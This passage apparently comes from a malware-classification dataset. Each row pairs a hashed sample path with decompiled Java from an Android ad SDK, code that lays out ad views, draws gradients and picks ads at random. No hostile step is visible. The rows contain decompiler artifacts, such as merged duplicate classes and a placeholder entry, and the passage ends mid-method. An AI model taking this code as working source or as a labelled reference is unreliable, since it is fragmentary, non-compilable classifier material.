layoutParams6.weight=1.0f;     linearLayout5.addView(bVar.d,layoutParams6);     bVar.d.setVisibility(4);     linearLayout5.addView(bVar.c,new LinearLayout.LayoutParams(-2,-2));     linearLayout4.addView(linearLayout5,layoutParams5);     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-1,-2);     layoutParams7.bottomMargin=cmn.ab.b(16.0f);     linearLayout4.addView(bVar.e,layoutParams7);     linearLayout4.addView(bVar.b,new LinearLayout.LayoutParams(-2,-2));     linearLayout2.addView(linearLayout4,layoutParams4);     linearLayout.addView(linearLayout2,layoutParams);     LinearLayout.LayoutParams layoutParams8=new LinearLayout.LayoutParams(-2,-2);     layoutParams8.bottomMargin=cmn.ab.b(36.0f);     layoutParams8.gravity=1;     linearLayout.addView(bVar.a,layoutParams8);     LinearLayout.LayoutParams layoutParams9=new LinearLayout.LayoutParams(-1,-2);     layoutParams9.topMargin=cmn.ab.b(8.0f);     linearLayout.addView(bVar.h,layoutParams9);     return linearLayout;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bu.code","public class bu implements j.c {   private static ViewGroup c(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     linearLayout.addView(bVar.b,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(0,0);     layoutParams.weight=1.0f;     linearLayout.addView(new View(context),layoutParams);     linearLayout.addView(bVar.c,new LinearLayout.LayoutParams(-2,-2));     return linearLayout;   }   @Override public final ViewGroup a(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     linearLayout.setGravity(1);     linearLayout.setPadding(0,cmn.ab.b(8.0f),0,cmn.ab.b(8.0f));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     layoutParams.setMargins(cmn.ab.b(8.0f),0,cmn.ab.b(8.0f),cmn.ab.b(16.0f));     linearLayout.addView(c(context,bVar),layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.bottomMargin=cmn.ab.b(36.0f);     linearLayout.addView(bVar.a,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout.addView(bVar.d,layoutParams3);     bVar.d.setGravity(1);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,-2);     layoutParams4.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.f,layoutParams4);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,-2);     layoutParams5.setMargins(cmn.ab.b(16.0f),0,cmn.ab.b(16.0f),cmn.ab.b(16.0f));     linearLayout.addView(bVar.e,layoutParams5);     bVar.e.setGravity(1);     linearLayout.addView(bVar.g,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     layoutParams6.setMargins(cmn.ab.b(8.0f),cmn.ab.b(16.0f),cmn.ab.b(8.0f),0);     linearLayout.addView(bVar.h,layoutParams6);     bVar.h.setGravity(1);     return linearLayout;   }   @Override public final boolean a(){     return true;   }   @Override public final ViewGroup b(  Context context,  j.b bVar){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     linearLayout.setPadding(cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f),cmn.ab.b(8.0f));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);     layoutParams.bottomMargin=cmn.ab.b(8.0f);     linearLayout.addView(c(context,bVar),layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.bottomMargin=cmn.ab.b(36.0f);     layoutParams2.gravity=1;     linearLayout.addView(bVar.a,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.bottomMargin=cmn.ab.b(16.0f);     linearLayout.addView(bVar.d,layoutParams3);     ViewGroup.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,-2);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(0);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(0,0);     layoutParams5.weight=1.0f;     linearLayout2.addView(bVar.f,layoutParams5);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(0,-2);     layoutParams6.leftMargin=cmn.ab.b(8.0f);     layoutParams6.weight=1.0f;     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     linearLayout3.addView(bVar.e,new LinearLayout.LayoutParams(-1,-2));     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-2,-2);     layoutParams7.topMargin=cmn.ab.b(16.0f);     linearLayout3.addView(bVar.g,layoutParams7);     linearLayout2.addView(linearLayout3,layoutParams6);     linearLayout.addView(linearLayout2,layoutParams4);     LinearLayout.LayoutParams layoutParams8=new LinearLayout.LayoutParams(-1,-2);     layoutParams8.topMargin=cmn.ab.b(8.0f);     linearLayout.addView(bVar.h,layoutParams8);     bVar.h.setGravity(1);     return linearLayout;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bv.code","public final class bv {   private static final Random a=new Random();   private static j.b b=null;   private static long c=Long.MIN_VALUE;   private static String d=null;   public static int a(  Context context,  j.b bVar){     int i=0;     HashSet<Integer> hashSet=new HashSet();     for (int i2=0; i2 < bVar.g(); i2++) {       String a2=bVar.a(i2);       if (!a2.equals(d) && !cmn.q.a(context,a2)) {         hashSet.add(Integer.valueOf(i2));       }     }     if (!hashSet.isEmpty()) {       Iterator it=hashSet.iterator();       while (it.hasNext()) {         i+=bVar.g(((Integer)it.next()).intValue());       }       int nextInt=a.nextInt(i);       int i3=nextInt;       for (      Integer num : hashSet) {         i3-=bVar.g(num.intValue());         if (i3 < 0) {           d=bVar.a(num.intValue());           return num.intValue();         }       }     }     return -1;   }   public static void a(  Context context,  cmn.aa aaVar){     if (c < SystemClock.elapsedRealtime() - 900000) {       new bw(context,aaVar).a((Object[])new Void[0]);     }  else {       aaVar.a(b);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bw.code","public final class bw extends cmn.f {   final Context d;   final cmn.aa e;   public bw(  Context context,  cmn.aa aaVar){     this.d=context;     this.e=aaVar;   }   @Override public j.b a(){     try {       return bd.a(this.d).a(j.f.t().c());     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   @Override protected final void a(  Object obj){     j.b bVar;     j.b bVar2;     long elapsedRealtime=SystemClock.elapsedRealtime();     j.b unused=bv.b=(j.b)obj;     bVar=bv.b;     if (bVar == null) {       long unused2=bv.c=(elapsedRealtime - 900000) + 300000;     }  else {       long unused3=bv.c=elapsedRealtime;     }     cmn.aa aaVar=this.e;     bVar2=bv.b;     aaVar.a(bVar2);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bx.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6880f559"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\by.code","final class by extends Drawable {   Path a=new Path();   Path b=new Path();   Paint c=new Paint();   final bx.e d;   final int e;   final int f;   final int g;   final bx.a h;   public by(  bx.a aVar,  bx.e eVar,  int i,  int i2,  int i3){     this.h=aVar;     this.d=eVar;     this.e=i;     this.f=i2;     this.g=i3;     this.c.setColor(this.d.d);     this.c.setStrokeWidth(this.e);     this.c.setStrokeJoin(Paint.Join.MITER);     this.c.setStyle(Paint.Style.STROKE);     this.a.moveTo(this.f - 100,this.g - 100);     this.a.lineTo(this.f,this.g);     this.a.lineTo(this.f - 100,this.g + 100);   }   @Override public final void draw(  Canvas canvas){     canvas.drawPath(this.a,this.c);     canvas.drawPath(this.b,this.c);   }   @Override public final int getOpacity(){     return 0;   }   @Override protected final void onBoundsChange(  Rect rect){     super.onBoundsChange(rect);     this.a.offset(rect.right - rect.left,0.0f,this.b);   }   @Override public final void setAlpha(  int i){   }   @Override public final void setColorFilter(  ColorFilter colorFilter){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\bz.code","final class bz extends ShapeDrawable.ShaderFactory {   final int a;   final bx.e b;   final bx.a c;   public bz(  bx.a aVar,  int i,  bx.e eVar){     this.c=aVar;     this.a=i;     this.b=eVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,this.a,new int[]{this.b.d,this.b.e},(float[])null,Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\c.code","public interface c {   View a(  Context context,  String str,  String str2,  e eVar,  int i,  View.OnClickListener onClickListener); } final class c extends ShapeDrawable.ShaderFactory {   final bx.e a;   final bx.b b;   public c(  bx.b bVar,  bx.e eVar){     this.b=bVar;     this.a=eVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,cmn.ab.b(50.0f),new int[]{this.a.d,this.a.e},(float[])null,Shader.TileMode.CLAMP);   } } public interface c {   ViewGroup a(  Context context,  b bVar);   boolean a();   ViewGroup b(  Context context,  b bVar); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\C0006a.code","public static class C0006a {   public final int a;   public final int b;   private C0006a(  int i,  int i2){     this.a=i;     this.b=i2;   }   public static C0006a a(){     StackTraceElement[] stackTrace=new Exception().getStackTrace();     StringBuffer stringBuffer=new StringBuffer();     String a=a(a.class.getName());     String str="""";     for (    StackTraceElement stackTraceElement : stackTrace) {       if (!a(stackTraceElement.getClassName()).equals(a)) {         stringBuffer.append(stackTraceElement.toString());         if (str.length() == 0) {           str=stackTraceElement.toString();         }       }     }     return new C0006a(str.hashCode(),stringBuffer.hashCode());   }   public static C0006a a(  Intent intent){     return intent == null ? new C0006a(-1,-1) : new C0006a(intent.getIntExtra(""hash_last"",-1),intent.getIntExtra(""hash"",-1));   }   private static String a(  String str){     int lastIndexOf=str.lastIndexOf(46);     return lastIndexOf != -1 ? str.substring(0,lastIndexOf) : str;   }   public final void b(  Intent intent){     intent.putExtra(""hash_last"",this.a);     intent.putExtra(""hash"",this.b);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\C0007a.code","public static class C0007a {   private int a;   private int b;   private int c;   private int d;   private C0007a(){   }   C0007a(  byte b){     this();   }   public final C0007a a(  int i){     this.d=i;     return this;   }   public final C0007a a(  int i,  int i2){     this.a=i;     this.b=i2;     return this;   }   public final a a(){     return new a(this,(byte)0);   }   public final C0007a b(  int i){     this.c=i;     return this;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\d.code","public static class d implements g {   @Override public final int a(){     return bx.c.nextInt(bx.a.length);   }   @Override public final View a(  Context context,  String str,  String str2,  String str3,  String str4,  e eVar,  View.OnClickListener onClickListener){     e eVar2=new e();     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     ShapeDrawable shapeDrawable=new ShapeDrawable(new RectShape());     shapeDrawable.setShaderFactory(new com.appbrain.a.d(this));     cmn.a.a().a(linearLayout,shapeDrawable);     ImageView imageView=new ImageView(context);     imageView.setImageDrawable(new com.appbrain.d.h(context,str3));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(cmn.ab.b(38.0f),cmn.ab.b(38.0f));     layoutParams.gravity=17;     layoutParams.leftMargin=cmn.ab.b(4.0f);     layoutParams.rightMargin=cmn.ab.b(4.0f);     linearLayout.addView(imageView,layoutParams);     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(1);     xVar.setTypeface(xVar.getTypeface(),1);     xVar.setText(str);     xVar.setTextSize(0,cmn.ab.a(16.0f));     xVar.setTextColor(eVar2.c);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-1,-2);     linearLayout2.addView(xVar,layoutParams2);     cmn.x xVar2=new cmn.x(context);     xVar2.setMaxLines(1);     xVar2.setText(str2);     xVar2.setTextSize(0,cmn.ab.a(13.0f));     xVar2.setTextColor(eVar2.c);     linearLayout2.addView(xVar2,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     layoutParams3.gravity=19;     layoutParams3.weight=2.0f;     layoutParams3.topMargin=cmn.ab.b(2.0f);     layoutParams3.leftMargin=cmn.ab.b(4.0f);     layoutParams3.rightMargin=cmn.ab.b(4.0f);     layoutParams3.bottomMargin=cmn.ab.b(4.0f);     linearLayout.addView(linearLayout2,layoutParams3);     ImageButton imageButton=new ImageButton(context);     imageButton.setScaleType(ImageView.ScaleType.CENTER_INSIDE);     imageButton.setImageDrawable(bx.a(eVar2.g));     com.appbrain.d.a aVar=new com.appbrain.d.a(new RectShape());     aVar.a().setColor(-10908144);     aVar.a().setStrokeWidth(cmn.ab.b(1.0f));     aVar.setShaderFactory(new com.appbrain.a.e(this));     cmn.a.a().a(imageButton,com.appbrain.d.c.b(context,aVar));     imageButton.setPadding(cmn.ab.b(12.0f),cmn.ab.b(12.0f),cmn.ab.b(12.0f),cmn.ab.b(12.0f));     ViewGroup.LayoutParams layoutParams4=new LinearLayout.LayoutParams(cmn.ab.b(50.0f),cmn.ab.b(50.0f));     imageButton.setOnClickListener(onClickListener);     linearLayout.addView(imageButton,layoutParams4);     return linearLayout;   } } final class d extends ShapeDrawable.ShaderFactory {   final bx.d a;   public d(  bx.d dVar){     this.a=dVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,cmn.ab.b(50.0f),new int[]{-14408668,-10000280,-12763586,-12763586,-14408668},new float[]{0.0f,0.02f,0.04f,0.8f,1.0f},Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\e.code","public static class e {   public int a;   public int b;   public int c;   public int d;   public int e;   public int f;   public int g;   public int h;   public e(){     this.a=-14474461;     this.b=-13421773;     this.c=-1;     this.d=-14653729;     this.e=-14653729;     this.f=-14257944;     this.g=-1;   }   public e(  int i,  int i2,  int i3,  int i4,  int i5,  int i6,  int i7,  int i8){     this.a=i;     this.b=i2;     this.c=i3;     this.d=i4;     this.e=i5;     this.f=i6;     this.g=i7;     this.h=i8;   } } final class e extends ShapeDrawable.ShaderFactory {   final bx.d a;   public e(  bx.d dVar){     this.a=dVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,cmn.ab.b(50.0f),new int[]{-10908144,-6372760,-8343745,-8343745,-10908144},new float[]{0.0f,0.02f,0.04f,0.8f,1.0f},Shader.TileMode.CLAMP);   } } public static class e extends ImageView {   private float a;   private int b;   public e(  Context context){     super(context);   }   public final void a(){     this.a=2.05f;   }   public final void b(){     this.b=20;   }   @Override protected final void onMeasure(  int i,  int i2){     if (this.a == 0.0f) {       super.onMeasure(i,i2);       return;     }     int size=View.MeasureSpec.getSize(i);     int i3=(int)(size / this.a);     setMeasuredDimension(size,i3);     int i4=(size * this.b) / 100;     int i5=(i3 * this.b) / 100;     setPadding(i4,i5,i4,i5);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\f.code","public static class f implements g {   @Override public final int a(){     return 0;   }   @Override public final View a(  Context context,  String str,  String str2,  String str3,  String str4,  e eVar,  View.OnClickListener onClickListener){     ImageView imageView=new ImageView(context);     cmn.aj.a(imageView,str4,new com.appbrain.a.f(this,imageView,onClickListener));     return imageView;   } } final class f implements cmn.aa {   final ImageView a;   final View.OnClickListener b;   final bx.f c;   public f(  bx.f fVar,  ImageView imageView,  View.OnClickListener onClickListener){     this.c=fVar;     this.a=imageView;     this.b=onClickListener;   }   @Override public final void a(  Object obj){     this.a.setOnClickListener(this.b);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\g.code","public interface g {   int a();   View a(  Context context,  String str,  String str2,  String str3,  String str4,  e eVar,  View.OnClickListener onClickListener); } final class g extends com.appbrain.d.g {   Paint a;   Path b;   final bx.e c;   final bx.h d;   public g(  bx.h hVar,  int i,  int i2,  bx.e eVar){     super(i,i2);     this.d=hVar;     this.c=eVar;     this.a=new Paint(1);     this.a.setColor(this.c.h);   }   @Override public final void draw(  Canvas canvas){     super.draw(canvas);     canvas.drawPath(this.b,this.a);   }   @Override public final void setBounds(  int i,  int i2,  int i3,  int i4){     super.setBounds(i,i2,i3,i4);     this.b=new Path();     this.b.moveTo(i,i4);     this.b.arcTo(new RectF(i - cmn.ab.a(30.0f),i2 - cmn.ab.a(50.0f),i3 + cmn.ab.a(30.0f),(((i4 - i2) * 2) / 3) + i2),180.0f,-180.0f);     this.b.lineTo(i3,i4);     this.b.lineTo(i,i4);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\h.code","public static class h implements c {   @Override public final View a(  Context context,  String str,  String str2,  e eVar,  int i,  View.OnClickListener onClickListener){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(1);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(1);     xVar.setText(str);     xVar.setTextSize(13.0f);     xVar.setPadding(cmn.ab.b(2.0f),cmn.ab.b(2.0f),cmn.ab.b(2.0f),0);     xVar.setTextColor(eVar.c);     int i2=eVar.b;     if (i2 == eVar.a) {       i2=(eVar.a & (-16777216)) | (((int)(0.95d * (eVar.a & 16711680))) & 16711680) | (((int)(0.95d * (eVar.a & android.support.v4.view.f.ACTION_POINTER_INDEX_MASK))) & android.support.v4.view.f.ACTION_POINTER_INDEX_MASK)| (((int)(0.95d * (eVar.a & 255))) & 255);     }     cmn.a.a().a(linearLayout,new com.appbrain.a.g(this,eVar.a,i2,eVar));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,cmn.ab.b(20.0f));     layoutParams.gravity=17;     linearLayout.addView(xVar,layoutParams);     cmn.w wVar=new cmn.w(context);     com.appbrain.d.a a=com.appbrain.d.a.a(context,0.5f,eVar.f);     a.a().setStrokeWidth(cmn.ab.a(1.0f));     a.setShaderFactory(new com.appbrain.a.h(this,i,eVar));     wVar.setTextColor(eVar.g);     wVar.setText(str2.toUpperCase());     wVar.setTextSize(12.0f);     wVar.setTypeface(Typeface.defaultFromStyle(1));     cmn.a.a().a(wVar,new InsetDrawable((Drawable)com.appbrain.d.c.b(context,a),2));     wVar.setPadding(cmn.ab.b(4.0f),cmn.ab.b(4.0f),cmn.ab.b(4.0f),cmn.ab.b(4.0f));     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.leftMargin=cmn.ab.b(2.0f);     layoutParams2.rightMargin=cmn.ab.b(2.0f);     layoutParams2.topMargin=0;     layoutParams2.bottomMargin=cmn.ab.b(2.0f);     layoutParams2.gravity=17;     wVar.setOnClickListener(onClickListener);     linearLayout.addView(wVar,layoutParams2);     return linearLayout;   } } final class h extends ShapeDrawable.ShaderFactory {   final int a;   final bx.e b;   final bx.h c;   public h(  bx.h hVar,  int i,  bx.e eVar){     this.c=hVar;     this.a=i;     this.b=eVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,this.a,new int[]{this.b.d,this.b.e},(float[])null,Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\i.code","public static class i implements c {   @Override public final View a(  Context context,  String str,  String str2,  e eVar,  int i,  View.OnClickListener onClickListener){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(2);     xVar.setText(str);     xVar.setTextSize(13.0f);     xVar.setPadding(6,6,6,6);     xVar.setTextColor(eVar.c);     cmn.a.a().a(linearLayout,new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{eVar.a,eVar.b}));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(0,-2);     layoutParams.gravity=17;     layoutParams.weight=2.0f;     linearLayout.addView(xVar,layoutParams);     cmn.w wVar=new cmn.w(context);     wVar.setMaxLines(2);     com.appbrain.d.a a=com.appbrain.d.a.a(context,2.0f,eVar.f);     a.setShaderFactory(new com.appbrain.a.i(this,i,eVar));     wVar.setTextColor(eVar.g);     wVar.setText(str2);     wVar.setTextSize(13.0f);     wVar.setTypeface(Typeface.defaultFromStyle(1));     cmn.a.a().a(wVar,com.appbrain.d.c.b(context,a));     wVar.setPadding(8,8,8,8);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(0,-2);     layoutParams2.weight=1.0f;     layoutParams2.leftMargin=4;     layoutParams2.rightMargin=4;     layoutParams2.topMargin=4;     layoutParams2.bottomMargin=4;     layoutParams2.gravity=16;     wVar.setOnClickListener(onClickListener);     linearLayout.addView(wVar,layoutParams2);     linearLayout.setWeightSum(3.0f);     return linearLayout;   } } final class i extends ShapeDrawable.ShaderFactory {   final int a;   final bx.e b;   final bx.i c;   public i(  bx.i iVar,  int i,  bx.e eVar){     this.c=iVar;     this.a=i;     this.b=eVar;   }   @Override public final Shader resize(  int i,  int i2){     return new LinearGradient(0.0f,0.0f,0.0f,this.a,new int[]{this.b.d,this.b.e},(float[])null,Shader.TileMode.CLAMP);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.a\j.code","public static class j implements c {   @Override public final View a(  Context context,  String str,  String str2,  e eVar,  int i,  View.OnClickListener onClickListener){     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     cmn.x xVar=new cmn.x(context);     xVar.setMaxLines(2);     xVar.setText(str);     xVar.setTextSize(13.0f);     xVar.setPadding(cmn.ab.b(12.0f),cmn.ab.b(6.0f),cmn.ab.b(12.0f),cmn.ab.b(6.0f));     xVar.setTextColor(eVar.c);     xVar.setTypeface(Typeface.SERIF);     cmn.a.a().a(linearLayout,new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{eVar.a,eVar.b}));     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(0,-2);     layoutParams.gravity=17;     layoutParams.weight=7.0f;     linearLayout.addView(xVar,layoutParams);     cmn.w wVar=new cmn.w(context);     wVar.setMaxLines(2);     com.appbrain.d.a a=com.appbrain.d.a.a(context,0.5f,eVar.f);     a.a().setStrokeWidth(cmn.ab.a(3.0f));     a.setShaderFactory(new com.appbrain.a.k(this,i,eVar));     wVar.setTextColor(eVar.g);     wVar.setText(str2);     wVar.setTextSize(13.0f);     wVar.setTypeface(Typeface.defaultFromStyle(1));     cmn.a.a().a(wVar,com.appbrain.d.c.b(context,a));     wVar.setPadding(cmn.ab.b(6.0f),cmn.ab.b(6.0f),cmn.ab.b(6.0f),cmn.ab.b(6.0f));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout2.setOrientation(1);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.gravity=17;     linearLayout2.addView(wVar,layoutParams2);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(0,-2);     layoutParams3.weight=3.0f;     layoutParams3.leftMargin=cmn.ab.b(2.0f);     layoutParams3.rightMargin=cmn.ab.b(2.0f);     layoutParams3.topMargin=cmn.ab.b(2.0f);     layoutParams3.bottomMargin=cmn.ab.b(2.0f);     layoutParams3.gravity=17;     wVar.setOnClickListener(onClickListener);     linearLayout.addView(linearLayout2,layoutParams3);     linearLayout.setWeightSum(10.0f);     return linearLayout;   } } public class j {   private static final Class[] a={bs.class,bt.class,bu.class};   private static final a[] b={new a(-8343745,false,0 == true ? 1 : 0),new a(-82174,true,0 == true ? 1 : 0)};   private static final String c=j.class.getName();   private static final String d=c + "".ImpressionCounted"";   private static final String e=c + "".Selected"";   private static final String f=c + "".Light"";   private static final String g=c + "".Starburst"";   private static final String h=c + "".Layout"";   private static final String i=c + "".Button"";   private final Context j;   private final Runnable k;   private final boolean l;   private final boolean m;   private final int n;   private final int o;   private final d p;   private final String q;   private final Random r=new Random();   private boolean s;   private int t; public static class a {     private final int a;     private final boolean b;     private a(    int i,    boolean z){       this.a=i;       this.b=z;     }     a(    int i,    boolean z,    byte b){       this(i,z);     }   } public class b {     public ProgressBar a;     public TextView b;     public ImageView c;     public TextView d;     public TextView e;     public e f;     public TextView g;     public TextView h;     public b(){     }   } public interface c {     ViewGroup a(    Context context,    b bVar);     boolean a();     ViewGroup b(    Context context,    b bVar);   }   public enum d {  ACTIVITY,   FRAGMENT} public static class e extends ImageView {     private float a;     private int b;     public e(    Context context){       super(context);     }     public final void a(){       this.a=2.05f;     }     public final void b(){       this.b=20;     }     @Override protected final void onMeasure(    int i,    int i2){       if (this.a == 0.0f) {         super.onMeasure(i,i2);         return;       }       int size=View.MeasureSpec.getSize(i);       int i3=(int)(size / this.a);       setMeasuredDimension(size,i3);       int i4=(size * this.b) / 100;       int i5=(i3 * this.b) / 100;       setPadding(i4,i5,i4,i5);     }   }   public j(  Context context,  Bundle bundle,  com.appbrain.a aVar,  d dVar,  boolean z,  Runnable runnable){     this.j=context;     this.k=runnable;     this.p=dVar;     if (bundle == null) {       this.s=false;       this.t=-1;       a.EnumC0005a b2=aVar == null ? null : aVar.b();       this.l=b2 == a.EnumC0005a.LIGHT ? true : b2 == a.EnumC0005a.DARK ? false : this.r.nextBoolean();       this.m=this.r.nextBoolean();       this.n=this.r.nextInt(a.length);       this.o=this.r.nextInt(b.length);     }  else {       this.s=bundle.getBoolean(d);       this.t=bundle.getInt(e);       this.l=bundle.getBoolean(f);       this.m=bundle.getBoolean(g);       this.n=bundle.getInt(h);       this.o=bundle.getInt(i);     }     this.q=new w.a().a(""single_app"").a((this.l ? 1 : 0) + ((this.n & 15) << 4) + ((this.o & 15) << 8)+ ((this.m ? 1 : 0) << 12)+ ((this.p.ordinal() & 15) << 16)).a(aVar.c()).b(z).toString();   }   private Drawable a(  int i2,  int i3){     Paint paint=new Paint();     paint.setColor(i3);     paint.setStrokeWidth(cmn.ab.b(1.5f));     paint.setAntiAlias(true);     bo boVar=new bo(this,new OvalShape(),paint);     boVar.getPaint().setColor(i2);     boVar.setIntrinsicWidth(cmn.ab.b(28.0f));     boVar.setIntrinsicHeight(cmn.ab.b(28.0f));     return boVar;   }   private Drawable a(  int i2,  boolean z){     RectF rectF=new RectF();     int b2=cmn.ab.b(2.0f);     int b3=z ? cmn.ab.b(3.0f) : 0;     int b4=b3 + cmn.ab.b(1.0f);     Paint paint=new Paint();     paint.setColor(i2);     Paint paint2=new Paint();     paint2.setColor(-1);     if (z) {       paint2.setShadowLayer(b3,0.0f,0.0f,-16777216);     }     return new bn(this,rectF,b3,b2,paint2,b4,paint);   }   public static void a(  j jVar,  j.b bVar,  b bVar2,  boolean z){     String b2;     if (bVar == null) {       jVar.k.run();       return;     }     if (jVar.t < 0 || jVar.t >= bVar.g()) {       jVar.t=bv.a(jVar.j,bVar);     }     if (jVar.t < 0) {       jVar.k.run();       return;     }     String e2=bVar.e(jVar.t);     boolean k=bVar.k();     String a2=bVar.a(jVar.t);     String str=bVar.i() + jVar.q;     String f2=bVar.f(jVar.t);     if (!jVar.s) {       jVar.s=true;       w.b(jVar.j,str);     }     bm bmVar=new bm(jVar,e2,k,a2,str,f2);     bVar2.b.setVisibility(0);     bVar2.b.setOnClickListener(bmVar);     bVar2.a.setVisibility(8);     if (z) {       b2=bVar.l() > jVar.t ? bVar.h(jVar.t) : null;       if (TextUtils.isEmpty(b2)) {         String b3=bVar.b(jVar.t);         bVar2.f.setScaleType(ImageView.ScaleType.FIT_CENTER);         bVar2.f.setBackgroundColor(jVar.l ? 570425344 : -2013265920);         bVar2.f.b();         b2=b3;       }  else {         bVar2.f.setScaleType(ImageView.ScaleType.CENTER_CROP);       }     }  else {       b2=bVar.b(jVar.t);       bVar2.f.setScaleType(ImageView.ScaleType.CENTER_CROP);     }     bVar2.f.setVisibility(0);     bVar2.f.setOnClickListener(bmVar);     e eVar=bVar2.f;     e eVar2=bVar2.f;     int i2=eVar2.getLayoutParams().width;     int i3=eVar2.getLayoutParams().height;     if (i2 <= 0 || i3 <= 0) {       Point a3=cmn.a.a().a(eVar2.getContext());       eVar2.measure(View.MeasureSpec.makeMeasureSpec(a3.x,Integer.MIN_VALUE),View.MeasureSpec.makeMeasureSpec(a3.y,Integer.MIN_VALUE));       i2=eVar2.getMeasuredWidth();       i3=eVar2.getMeasuredHeight();     }     